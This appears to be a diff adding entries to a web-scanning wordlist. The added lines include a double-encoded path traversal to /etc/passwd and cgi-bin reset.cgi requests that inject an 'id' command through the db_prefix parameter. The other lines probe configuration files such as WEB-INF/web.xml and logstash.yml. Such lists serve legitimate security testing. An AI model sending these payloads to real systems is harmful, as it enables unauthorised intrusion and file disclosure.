@@ -1,3 +1,6 @@
+.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
+cgi-bin/reset.cgi?db_prefix=%26id%26
+cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
 context/%2e/WEB-INF/web.xml
 etc/logstash/logstash.yml
 env.development.js
